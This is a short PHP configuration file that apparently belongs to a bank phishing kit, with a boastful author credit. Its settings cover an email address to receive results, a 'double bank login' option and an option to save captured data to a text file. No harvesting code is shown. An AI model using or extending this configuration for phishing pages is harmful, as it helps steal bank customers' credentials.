<?php

// ------------------------------------------------- //
  #                 BY: @blue_prints              #
  #             F#ck you credit changer :)        #
  # Change credit if you dont know how to code :) #
  #################################################
// -------------------------------------------------//

//important details
$emailzz = ""; // your email
$salt = "87Sdd12"; // File name to secure text file

//important on/off
$d_log = "on"; // double bank login

$savetxt = "on"; // to save text file


?>